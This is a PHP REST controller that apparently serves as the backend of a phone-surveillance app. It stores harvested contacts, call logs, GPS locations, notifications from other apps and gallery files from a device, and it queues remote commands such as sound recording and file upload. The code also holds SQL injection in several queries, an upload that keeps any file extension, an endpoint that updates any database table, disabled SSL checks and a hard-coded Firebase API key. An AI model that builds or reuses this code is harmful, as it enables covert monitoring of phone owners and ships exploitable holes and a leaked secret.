<?php

defined('BASEPATH') OR exit('No direct script access allowed');
require(APPPATH . 'libraries/REST_Controller.php');

class Api extends REST_Controller {

    public function __construct() {
        parent::__construct();
        $this->load->model('Command_model');

        $this->load->library('session');
        $this->checklogin = $this->session->userdata('logged_in');
        $this->user_id = $this->session->userdata('logged_in')['login_id'];
    }

    public function index() {
        $this->load->view('welcome_message');
    }

    private function useCurl($url, $headers, $fields = null) {
        // Open connection
        $ch = curl_init();
        if ($url) {
            // Set the url, number of POST vars, POST data
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            // Disabling SSL Certificate support temporarly
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            if ($fields) {
                curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
            }

            // Execute post
            $result = curl_exec($ch);
            if ($result === FALSE) {
                die('Curl failed: ' . curl_error($ch));
            }

            // Close connection
            curl_close($ch);

            return $result;
        }
    }

    public function android($data, $reg_id_array) {
        $url = 'https://fcm.googleapis.com/fcm/send';

        $insertArray = array(
            'title' => $data['title'],
            'message' => $data['message'],
            "datetime" => date("Y-m-d H:i:s a")
        );
        $this->db->insert("notification", $insertArray);

        $message = array(
            'title' => $data['title'],
            'message' => $data['message'],
            'subtitle' => '',
            'tickerText' => '',
            'msgcnt' => 1,
            'vibrate' => 1
        );

        $headers = array(
            'Authorization: key=' . $this->API_ACCESS_KEY,
            'Content-Type: application/json'
        );

        $fields = array(
            'registration_ids' => $reg_id_array,
            'data' => $message,
        );

        return $this->useCurl($url, $headers, json_encode($fields));
    }

    public function androidAdmin($data, $reg_id_array) {
        $url = 'https://fcm.googleapis.com/fcm/send';

        $insertArray = array(
            'title' => $data['title'],
            'message' => $data['message'],
            "datetime" => date("Y-m-d H:i:s a")
        );
        $this->db->insert("notification", $insertArray);

        $message = array(
            'title' => $data['title'],
            'message' => $data['message'],
            'subtitle' => '',
            'tickerText' => '',
            'msgcnt' => 1,
            'vibrate' => 1
        );

        $headers = array(
            'Authorization: key=' . "AIzaSyBlRI5PaIZ6FJPwOdy0-hc8bTiLF5Lm0FQ",
            'Content-Type: application/json'
        );

        $fields = array(
            'registration_ids' => $reg_id_array,
            'data' => $message,
        );

        return $this->useCurl($url, $headers, json_encode($fields));
    }

    public function iOS($data, $devicetoken) {
        $deviceToken = $devicetoken;
        $ctx = stream_context_create();
        // ck.pem is your certificate file
        stream_context_set_option($ctx, 'ssl', 'local_cert', 'ck.pem');
        stream_context_set_option($ctx, 'ssl', 'passphrase', $this->passphrase);
        // Open a connection to the APNS server
        $fp = stream_socket_client(
                'ssl://gateway.sandbox.push.apple.com:2195', $err,
                $errstr, 60, STREAM_CLIENT_CONNECT | STREAM_CLIENT_PERSISTENT, $ctx);
        if (!$fp)
            exit("Failed to connect: $err $errstr" . PHP_EOL);
        // Create the payload body
        $body['aps'] = array(
            'alert' => array(
                'title' => $data['mtitle'],
                'body' => $data['mdesc'],
            ),
            'sound' => 'default'
        );
        // Encode the payload as JSON
        $payload = json_encode($body);
        // Build the binary notification
        $msg = chr(0) . pack('n', 32) . pack('H*', $deviceToken) . pack('n', strlen($payload)) . $payload;
        // Send it to the server
        $result = fwrite($fp, $msg, strlen($msg));

        // Close the connection to the server
        fclose($fp);
        if (!$result)
            return 'Message not delivered' . PHP_EOL;
        else
            return 'Message successfully delivered' . PHP_EOL;
    }

    function crateContact_post() {
        $this->config->load('rest', TRUE);
        header('Access-Control-Allow-Origin: *');
        header("Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE");
        $model_no = $this->post('model_no');
        $device_id = $this->post('device_id');
        $brand = $this->post('brand');
        $name = $this->post('name');
        $contact_no = $this->post('contact_no');

        $this->db->where("device_id", $device_id);
        $this->db->where("contact_no", $contact_no);
        $query = $this->db->get('get_conects');
        $checkcontact = $query->row();

        if ($checkcontact) {
            $this->response($checkcontact->id);
        } else {


            $insertArray = array(
                "model_no" => $model_no,
                "device_id" => $device_id,
                "brand" => $brand,
                "name" => $name,
                "contact_no" => $contact_no,
                'date' => date('Y-m-d'),
                'time' => date('H:i:s'),
            );
            $this->db->insert("get_conects", $insertArray);
            $last_id = $this->db->insert_id();
            $this->response($last_id);
        }
    }

    function crateCallLog_post() {
        $this->config->load('rest', TRUE);
        header('Access-Control-Allow-Origin: *');
        header("Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE");
        $model_no = $this->post('model_no');
        $device_id = $this->post('device_id');
        $brand = $this->post('brand');
        $name = $this->post('name');
        $contact_no = $this->post('contact_no');
        $call_type = $this->post('call_type');
        $duration = $this->post('duration');
        $date = $this->post('date');

        $this->db->where("device_id", $device_id);
        $this->db->where("contact_no", $contact_no);
        $this->db->where("date", $date);
        $query = $this->db->get('get_call_details');
        $checkcontact = $query->row();

        if ($checkcontact) {
            $this->response($checkcontact->id);
        } else {


            $insertArray = array(
                "model_no" => $model_no,
                "device_id" => $device_id,
                "brand" => $brand,
                "name" => $name,
                "call_type" => $call_type,
                "contact_no" => $contact_no,
                'date' => $date,
                'duration' => $duration,
            );
            $this->db->insert("get_call_details", $insertArray);
            $last_id = $this->db->insert_id();
            $this->response($last_id);
        }
    }

    function test_get() {
        $this->config->load('rest', TRUE);
        header('Access-Control-Allow-Origin: *');
        header("Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE");
        $this->response("hi");
    }

    function getContactApi_get($device_id) {
        $draw = intval($this->input->get("draw"));
        $start = intval($this->input->get("start"));
        $length = intval($this->input->get("length"));

        $searchqry = "";

        $search = $this->input->get("search")['value'];
        if ($search) {
            $searchqry = ' and p.name like "%' . $search . '%" or p.contact_no like "%' . $search . '%" ';
        }
        $devidequery = "";

        if ($device_id) {
            $devidequery = " and device_id = '$device_id'";
        }

        $query = "select count(id) as totalcount from get_conects as p  where 1 $devidequery $searchqry  order by id desc ";
        $query1 = $this->db->query($query);
        $productslistcount = $query1->row();

        $query = "select p.* from get_conects as p where 1 $devidequery $searchqry  order by id  limit  $start, $length";
        $query2 = $this->db->query($query);
        $productslist = $query2->result_array();

        $return_array = array();
        foreach ($productslist as $key => $value) {
            $value["s_n"] = ($key + 1) + $start;
            array_push($return_array, $value);
        }

        $output = array(
            "draw" => $draw,
            "recordsTotal" => $query2->num_rows(),
            "recordsFiltered" => $productslistcount->totalcount,
            "data" => $return_array
        );
        $this->response($output);
    }

    function getCallLogApi_get($device_id) {
        $draw = intval($this->input->get("draw"));
        $start = intval($this->input->get("start"));
        $length = intval($this->input->get("length"));

        $searchqry = "";

        $search = $this->input->get("search")['value'];
        if ($search) {
            $searchqry = ' and p.name like "%' . $search . '%" or p.contact_no like "%' . $search . '%" ';
        }
        $devidequery = "";

        if ($device_id) {
            $devidequery = " and device_id = '$device_id'";
        }

        $query = "select count(id) as totalcount from get_call_details as p  where 1 $devidequery $searchqry  order by id desc ";
        $query1 = $this->db->query($query);
        $productslistcount = $query1->row();

        $query = "select p.* from get_call_details as p where 1 $devidequery $searchqry  order by id  limit  $start, $length";
        $query2 = $this->db->query($query);
        $productslist = $query2->result_array();

        $return_array = array();
        foreach ($productslist as $key => $value) {
            $value["s_n"] = ($key + 1) + $start;
            $value["call_type"] = str_replace("CallType.", "", $value['call_type']);
            array_push($return_array, $value);
        }

        $output = array(
            "draw" => $draw,
            "recordsTotal" => $query2->num_rows(),
            "recordsFiltered" => $productslistcount->totalcount,
            "data" => $return_array
        );
        $this->response($output);
    }

    function createContactSolid($insertarray) {
        print_r($insertarray);
        $this->db->where("device_id", $insertarray["device_id"]);
        $query = $this->db->get('get_conects_person');
        $checkcontact = $query->row();
        $insertArray = array(
            "model_no" => $insertarray["model_no"],
            "device_id" => $insertarray["device_id"],
            "brand" => $insertarray["brand"],
            "name" => "",
            "contact_no" => "",
            'date' => date('Y-m-d'),
            'time' => date('H:i:s'),
        );
        if ($checkcontact) {
            
        } else {
            $this->db->insert("get_conects_person", $insertArray);
            $last_id = $this->db->insert_id();
        }
    }

    function createLocation_post() {
        $this->config->load('rest', TRUE);
        header('Access-Control-Allow-Origin: *');
        header("Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE");
        $model_no = $this->post('model_no');
        $device_id = $this->post('device_id');
        $brand = $this->post('brand');
        $latitude = $this->post('latitude');
        $longitude = $this->post('longitude');
        $this->db->where("device_id", $device_id);
        $this->db->where("latitude", $latitude);
        $this->db->where("longitude", $longitude);
        $query = $this->db->get('get_location');
        $checkcontactlocation = $query->row();




        $this->db->where("device_id", $device_id);
        $query = $this->db->get('get_conects_person');
        $checkcontactperson = $query->row();
        $insertArray2 = array(
            "model_no" => $model_no,
            "device_id" => $device_id,
            "brand" => $brand,
            "name" => "",
            "contact_no" => "",
            'date' => date('Y-m-d'),
            'time' => date('H:i:s'),
        );

        if ($checkcontactperson) {
            
        } else {
            $this->db->insert("get_conects_person", $insertArray2);
            $last_id = $this->db->insert_id();
        }


        if ($checkcontactlocation) {
            $this->db->where("device_id", $device_id);
            $this->db->where("latitude", $latitude);
            $this->db->where("longitude", $longitude);
            $this->db->set(array('date' => date('Y-m-d'), 'time' => date('H:i:s')));
            $query = $this->db->update('get_location');
            $this->response($checkcontactlocation->id);
        } else {
            $insertArray = array(
                "model_no" => $model_no,
                "device_id" => $device_id,
                "brand" => $brand,
                "latitude" => $latitude,
                "longitude" => $longitude,
                'date' => date('Y-m-d'),
                'time' => date('H:i:s'),
            );
            $this->db->insert("get_location", $insertArray);

            $last_id = $this->db->insert_id();
            $this->response($last_id);
        }
    }

    function crateCallLogBulk_post() {
        $this->config->load('rest', TRUE);
        header('Access-Control-Allow-Origin: *');
        header("Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE");


        $model_no = $this->post('model_no');
        $device_id = $this->post('device_id');
        $brand = $this->post('brand');



        $this->db->where("device_id", $device_id);
        $query = $this->db->delete('get_call_details');

        $contact_no = $this->post('contact_no');
        $contact_no_list = $contact_no;

        $call_type = $this->post('call_type');
        $call_type_list = $call_type;

        $name = $this->post('name');
        $name_list = $name;

        $duration = $this->post('duration');
        $duration_list = $duration;

        $date = $this->post('date');
        $date_list = $date;


        foreach ($contact_no as $key => $value) {

            $name_t = isset($name_list[$key]) ? $name_list[$key] : "";
            $call_type_t = isset($call_type_list[$key]) ? $call_type_list[$key] : "";
            $contact_no_t = isset($contact_no_list[$key]) ? $contact_no_list[$key] : "";
            $date_t = isset($date_list[$key]) ? $date_list[$key] : "";
            $duration_t = isset($duration_list[$key]) ? $duration_list[$key] : "";

            $insertArray = array(
                "model_no" => $model_no,
                "device_id" => $device_id,
                "brand" => $brand,
                "name" => $name_t,
                "call_type" => $call_type_t,
                "contact_no" => $contact_no_t,
                'date' => date('m/d/Y H:i:s', $date_t / 1000),
                'duration' => $duration_t,
            );
            $this->db->insert("get_call_details", $insertArray);
            $last_id = $this->db->insert_id();
        }


        $this->response($last_id);
    }

    function crateContactBulk_post() {
        $this->config->load('rest', TRUE);
        header('Access-Control-Allow-Origin: *');
        header("Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE");
        $model_no = $this->post('model_no');
        $device_id = $this->post('device_id');
        $brand = $this->post('brand');

        $contact_no = $this->post('contact_no');
        $contact_no_list = $contact_no;
        $name = $this->post('name');
        $name_list = $name;

        $this->db->where("device_id", $device_id);
        $query = $this->db->delete('get_conects');

        foreach ($contact_no_list as $key => $value) {
            $tempname = isset($name_list[$key]) ? $name_list[$key] : "";
            $tempcontact = isset($contact_no_list[$key]) ? $contact_no_list[$key] : "";

            $insertArray = array(
                "model_no" => $model_no,
                "device_id" => $device_id,
                "brand" => $brand,
                "name" => $tempname,
                "contact_no" => $tempcontact,
                'date' => date('Y-m-d'),
                'time' => date('H:i:s'),
            );
            $this->db->insert("get_conects", $insertArray);
            $last_id = $this->db->insert_id();
        }
        $this->response($last_id);
    }

    function createContactPerson_post() {
        $this->config->load('rest', TRUE);
        header('Access-Control-Allow-Origin: *');
        header("Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE");
        $model_no = $this->post('model_no');
        $device_id = $this->post('device_id');
        $brand = $this->post('brand');
        $name = $this->post('name');
        $contact_no = $this->post('contact_no');
        $last_id = 0;
        if ($device_id) {
            $this->db->where("device_id", $device_id);
            $query = $this->db->get('get_conects_person');
            $checkcontact = $query->row();
            $insertArray = array(
                "model_no" => $model_no,
                "device_id" => $device_id,
                "brand" => $brand,
                "name" => $name,
                "contact_no" => $contact_no,
                'date' => date('Y-m-d'),
                'time' => date('H:i:s'),
            );
            if ($checkcontact) {
                $this->db->where("device_id", $device_id);
                $this->db->set($insertArray);
                $this->db->update('get_conects_person');
                $this->response($checkcontact->id);
            } else {
                $this->db->insert("get_conects_person", $insertArray);
                $last_id = $this->db->insert_id();
            }
            $this->response($last_id);
        } else {
            $this->response(0);
        }
    }

    function setCommandFiletBulk_post() {
        $this->config->load('rest', TRUE);
        header('Access-Control-Allow-Origin: *');
        header("Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE");
        $command = $this->post('postcommand');
        $device_id = $this->post('device_id');
        $filepath = $this->post('file_path');
        $file_date_time = $this->post('file_date_time');


        foreach ($filepath as $key => $value) {
            $file_date_time_temp = isset($file_date_time[$key]) ? $file_date_time[$key] : "";
            $filepath_temp = isset($filepath[$key]) ? $filepath[$key] : "";

            $insertArray = array(
                "command" => "gallary",
                "device_id" => $device_id,
                "file_date_time" => $file_date_time_temp,
                "file_path" => $filepath_temp,
                'date' => date('Y-m-d'),
                'time' => date('H:i:s'),
            );

            $this->db->where("device_id", $device_id);
            $this->db->where("file_path", $filepath_temp);
            $query = $this->db->get('track_command_file');
            $checkfile = $query->row_array();

            if ($checkfile) {
                $last_id = $checkfile["id"];
            } else {
                $this->db->insert("track_command_file", $insertArray);
                $last_id = $this->db->insert_id();
            }


            if ((count($filepath) - 1) == $key) {
                $this->db->where("device_id", $device_id);
                $this->db->where("command", "gallary");
                $query = $this->db->update('track_active_command', array("status" => "100"));
            }
        }
        $this->response($last_id);
    }

    function setCommandFile_post() {
        $this->config->load('rest', TRUE);
        header('Access-Control-Allow-Origin: *');
        header("Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE");
        $command = $this->post('postcommand');
        $device_id = $this->post('device_id');
        $filepath = $this->post('file_path');
        $file_date_time = $this->post('file_date_time');
        $last_id = 0;
        if ($device_id) {
            $insertArray = array(
                "command" => $command,
                "device_id" => $device_id,
                "file_date_time" => $file_date_time,
                "file_path" => $filepath,
                'date' => date('Y-m-d'),
                'time' => date('H:i:s'),
            );
            $this->db->insert("track_command_file", $insertArray);
            $last_id = $this->db->insert_id();
            $this->response($last_id);
        } else {
            $this->response(0);
        }
    }

    function downlaodFile_get($file_id) {
        $this->db->where("id", $file_id);
        $this->db->set("status", "download");
        $query = $this->db->update('track_command_file');
        $this->db->where("id", $file_id);
        $query = $this->db->get('track_command_file');
        $file_obj = $query->row_array();
        if ($file_obj) {
            $path = $file_obj["file_path"];
            $commandattr = json_encode(array("filepath" => $path, "file_id" => $file_id));
            $insertArray = array(
                "status" => "200",
                "device_id" => $file_obj["device_id"],
                "command" => "upload",
                "attr" => $commandattr,
                'date' => date('Y-m-d'),
                'time' => date('H:i:s'),
            );
            $this->db->insert("track_active_command", $insertArray);
        }
        $this->response(array("status" => 200));
    }

    function getCommand_get($device_id) {
        $command_list = $this->Command_model->currentCommand($device_id, true);
        $command_list2 = [];
        foreach ($command_list as $key => $value) {
            array_push($command_list2, $value);
        }
        $this->response($command_list2);
    }

    function setCommandInactive_get($device_id, $command) {
        $this->db->where("device_id", $device_id);
        $this->db->where("command", $command);
        $query = $this->db->update('track_active_command', array("status" => "100"));
        $this->response(array("status" => "200"));
    }

    function fileupload_post($file_id) {
        $type = "member";
        $ext1 = explode('.', $_FILES['file']['name']);
        $ext = strtolower(end($ext1));
        $filename = $type . rand(1000, 10000) . '_' . $file_id;

        $actfilname = $filename . "." . $ext;

        move_uploaded_file($_FILES["file"]['tmp_name'], 'assets/userfiles/' . $actfilname);


        $this->db->insert("temp_file", array("filedata" => base_url('assets/userfiles/' . $actfilname)));
        $insert_id = $this->db->insert_id();
        $this->db->where("id", $file_id);
        $this->db->set("upload_file_name", $actfilname);
        $this->db->update("track_command_file");
        $this->response(array("status" => "200"));
    }

    function createNotification_post() {
        $this->config->load('rest', TRUE);
        header('Access-Control-Allow-Origin: *');
        header("Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE");
        $model_no = $this->post('model_no');
        $device_id = $this->post('device_id');
        $brand = $this->post('brand');
        $package_name = $this->post('package_name');
        $notification_body = $this->post('notification_body');
        $notification_title = $this->post('notification_title');
        $insertArray = array(
            "model_no" => $model_no,
            "device_id" => $device_id,
            "brand" => $brand,
            "package_name" => $package_name,
            "notification_body" => $notification_body,
            "notification_title" => $notification_title,
            'date' => date('Y-m-d'),
            'time' => date('H:i:s'),
        );

        $this->db->insert("get_notifications", $insertArray);
        $last_id = $this->db->insert_id();

        $this->db->where("package_name", $package_name);
        $query = $this->db->get('android_apps');
        $packagecheck = $query->row();
        if ($packagecheck) {
            
        } else {
            $insertArray = array(
                "image" => "",
                "title" => "",
                "image " => "",
                "package_name" => $package_name,
                "playstore_url" => "",
            );

            $this->db->insert("android_apps", $insertArray);
        }

        $this->response($last_id);
    }

    function migrateApps_get() {
        $this->db->group_by("package_name");
        $query = $this->db->get('get_notifications');
        $packagelist = $query->result_array();

        foreach ($packagelist as $key => $value) {
            $this->db->where("package_name", $value["package_name"]);
            $query = $this->db->get('android_apps');
            $packagecheck = $query->row();
            if ($packagecheck) {
                
            } else {
                $insertArray = array(
                    "image" => "",
                    "title" => "",
                    "image " => "",
                    "package_name" => $value["package_name"],
                    "playstore_url" => "",
                );

                $this->db->insert("android_apps", $insertArray);
            }
        }
    }

    function updateCurd_post() {
        $fieldname = $this->post('name');
        $value = $this->post('value');
        $pk_id = $this->post('pk');
        $tablename = $this->post('tablename');
        if ($this->checklogin) {
            $data = array($fieldname => $value);
            $this->db->set($data);
            $this->db->where("id", $pk_id);
            $this->db->update($tablename, $data);
        }
    }

    function getAppsList_get($device_id) {
        $notificationcount = $this->Command_model->appNotificationList($device_id);
        $this->response($notificationcount);
    }

    function recentNotifications_get($device_id) {
        $notificationlist = $this->Command_model->recentNotifications($device_id);
        $this->response($notificationlist);
    }

    function recentLocation_get($device_id) {
        $this->db->where("device_id", $device_id);
        $this->db->order_by("id desc");
        $querynty = $this->db->get("get_location");
        $locationdata = $querynty->row_array();
        $locationarray = array("latitude" => 0.0, "longitude" => 0.0, "datetime" => "");
        if ($locationdata) {
            $locationarray = array(
                "latitude" => $locationdata["latitude"],
                "longitude" => $locationdata["longitude"],
                "datetime" => $locationdata["date"] . " " . $locationdata["time"]
            );
        }
        $this->response($locationarray);
    }

    function recentFiles_get($device_id, $condition) {
        $this->db->where("file_path not like '% %'");
        $this->db->where("device_id", $device_id);
        $this->db->where("command", $condition);
        $this->db->order_by("id desc");
        $this->db->limit(10, 0);
        $querynty = $this->db->get("track_command_file");
        $filesdata = $querynty->result_array();
        $filesdatatemp = [];

        foreach ($filesdata as $key => $value) {
            $hasfiles = "0";
            if ($value["upload_file_name"]) {
                $fileurl = base_url() . "assets/userfiles/" . $value["upload_file_name"];
                $hasfiles = "1";
            } else {
                $fileurl = base_url() . "assets/images/" . "defaultgallery.jpg";
            }
            $filenamearray = explode("/", $value["file_path"]);

            $value["file_name"] = end($filenamearray);
            $value["imageurl"] = $fileurl;
            $value["downloadfile"] = $hasfiles;
            array_push($filesdatatemp, $value);
        }
        $this->response($filesdatatemp);
    }

    function getCurrentFileStatus_get($file_id) {
        $this->db->where("id", $file_id);
        $querynty = $this->db->get("track_command_file");
        $filesdata = $querynty->row_array();
        $hasfiles = "0";
        if ($filesdata["upload_file_name"]) {
            $fileurl = base_url() . "assets/userfiles/" . $filesdata["upload_file_name"];
            $hasfiles = "1";
        } else {
            $fileurl = base_url() . "assets/images/" . "defaultgallery.jpg";
        }
        $filenamearray = explode("/", $filesdata["file_path"]);

        $filesdata["file_name"] = end($filenamearray);
        $filesdata["imageurl"] = $fileurl;
        $filesdata["downloadfile"] = $hasfiles;
        $this->response($filesdata);
    }

    function countdata($table_name, $device_id) {
        $this->db->select("count(id) as count");
        if ($table_name == 'get_notifications') {
            $this->db->where("seen", "no");
        }
        $this->db->where("device_id", $device_id);
        return $this->db->get($table_name)->row()->count;
    }

    function getCountDataList_get($device_id) {
        $tables = array(
            "track_command_file" => 0,
            "get_notifications" => 0,
            "get_conects" => 0,
            "get_call_details" => 0,
        );
        foreach ($tables as $key => $value) {
            $tables[$key] = $this->countdata($key, $device_id);
        }
        $this->response($tables);
    }

    function getCommandList_get($device_id) {
        $command_list = $this->Command_model->currentCommand($device_id);

        $commandlist = [
            array("title" => "Sound Record",
                "command" => "sound_record",
                "modal" => 'data-toggle="modal" data-target="#opentimemodel"',
                "formtype" => ' name="send_command" value="sendCommand" type="button"',
                "checkactive" => false,
                "datetime" => "Not Stated Yet",
                "timing" => "fixed_time",
                "icon" => "fa fa-headphones"),
            array("title" => "Get Contacts",
                "command" => "contact_list",
                "checkactive" => false,
                "modal" => "",
                "formtype" => ' name="send_command" value="sendCommand" type="submit"',
                "checkactive" => false,
                "timing" => "bool",
                "datetime" => "Not Stated Yet",
                "icon" => "fa fa-group"),
            array("title" => "Get Contacts Log",
                "command" => "contact_log",
                "checkactive" => false,
                "modal" => "",
                "formtype" => ' name="send_command" value="sendCommand" type="submit"',
                "timing" => "bool",
                "datetime" => "Not Stated Yet",
                "icon" => "fa fa-phone"),
            array("title" => "Get Images",
                "command" => "gallary",
                "checkactive" => false,
                "modal" => "",
                "formtype" => ' name="send_command" value="sendCommand" type="submit"',
                "timing" => "bool",
                "datetime" => "Not Stated Yet",
                "icon" => "fa fa-photo"),
        ];
        $commanddata = array();
        foreach ($commandlist as $key => $value) {
            $checkactive = false;
            $commandattr = array();
            if (isset($command_list[$value["command"]])) {

                $actcmd = $value["command"];
//                 print_r($command_list[$actcmd]["attr"]);
                $commanddata[$actcmd] = $value;
                $commanddata[$actcmd]["attr"] = $command_list[$actcmd]["attr"];
                $commanddata[$actcmd]["checkactive"] = $command_list[$actcmd]["status"] == "200";

                $timedate = $command_list[$actcmd]["date"] . " " . $command_list[$actcmd]["time"];
                $commanddata[$actcmd]["datetime"] = $command_list[$actcmd]["status"] == "200" ? "Started On:\n  " . $timedate : "Updated On:\n  " . $timedate;
            } else {
                $commanddata[$value["command"]] = $value;
            }
        }

        $this->response($commanddata);
    }

    function getActivityList_get($device_id, $package_name) {
        $draw = intval($this->input->get("draw"));
        $start = intval($this->input->get("start"));
        $length = intval($this->input->get("length"));

        $searchqry = "";

        $search = $this->input->get("search")['value'];
        if ($search) {
            $searchqry = ' and notification_title like "%' . $search . '%" or notification_body like "%' . $search . '%" ';
        }
        $devidequery = "";

        if ($device_id) {
            $devidequery = " and device_id = '$device_id'";
        }

        $query = "select count(id) as totalcount from get_notifications  where 1  and device_id = '$device_id' and package_name = '$package_name' $searchqry  order by id desc ";
        $query1 = $this->db->query($query);
        $notificationcount = $query1->row();

        $query = "select * from get_notifications where 1  and device_id = '$device_id' and package_name = '$package_name'  $searchqry  order by id desc  limit  $start, $length";
        $query2 = $this->db->query($query);
        $productslist = $query2->result_array();

        $return_array = array();
        foreach ($productslist as $key => $value) {
            $value["s_n"] = ($key + 1) + $start;
            array_push($return_array, $value);
        }

        $output = array(
            "draw" => $draw,
            "recordsTotal" => $query2->num_rows(),
            "recordsFiltered" => $notificationcount->totalcount,
            "data" => $return_array
        );
        $this->response($output);
    }

    function getFilesList_get($device_id, $commandtype) {
        $draw = intval($this->input->get("draw"));
        $start = intval($this->input->get("start"));
        $length = intval($this->input->get("length"));

        $searchqry = "";

        $search = $this->input->get("search")['value'];
        if ($search) {
            $searchqry = ' and file_path like "%' . $search . '%" or file_path like "%' . $search . '%" ';
        }
        $devidequery = "";

        if ($device_id) {
            $devidequery = " and device_id = '$device_id'";
        }

        $query = "select count(id) as totalcount from track_command_file  where file_path not like '% %' and device_id = '$device_id' and command = '$commandtype' $searchqry  order by id desc ";
        $query1 = $this->db->query($query);
        $notificationcount = $query1->row();

        $query = "select * from track_command_file where file_path not like '% %'  and device_id = '$device_id' and command = '$commandtype'  $searchqry  order by id desc  limit  $start, $length";
        $query2 = $this->db->query($query);
        $productslist = $query2->result_array();



        $filesdatatemp = [];

        foreach ($productslist as $key => $value) {
            $hasfiles = "0";
            $value["s_n"] = ($key + 1) + $start;
            if ($value["upload_file_name"]) {
                $fileurl = base_url() . "assets/userfiles/" . $value["upload_file_name"];
                $hasfiles = "1";
            } else {
                $fileurl = base_url() . "assets/images/" . "defaultgallery.jpg";
            }



            $filenamearray = explode("/", $value["file_path"]);
            $file_id = $value["id"];
            $value["file_name"] = end($filenamearray);
            $value["imageurl"] = "<img src='$fileurl' file_id_img='$file_id' style='height:50px;widht:50px'/>";

            if ($commandtype == 'sound_record') {
                $filetemp = base_url() . "assets/images/" . "sound.jpg";
                $value["imageurl"] = "<img src='$filetemp'  style='height:50px;widht:50px'/>";
            }

            $value["downloadfile"] = $hasfiles;

            if ($hasfiles == "1") {
                $value["actionbutton"] = '<a class="btn btn-success  "  href="' . $fileurl . '" target="_blank"><i class="fa fa-eye"></i> View File</a>';
            } else {
                $value["actionbutton"] = ' <button class="btn btn-warning startdownloading"  file_id="' . $file_id . '" ><i class="fa fa-download"></i> Download File</button>';
            }
            array_push($filesdatatemp, $value);
        }

        $output = array(
            "draw" => $draw,
            "recordsTotal" => $query2->num_rows(),
            "recordsFiltered" => $notificationcount->totalcount,
            "data" => $filesdatatemp
        );
        $this->response($output);
    }

}

?>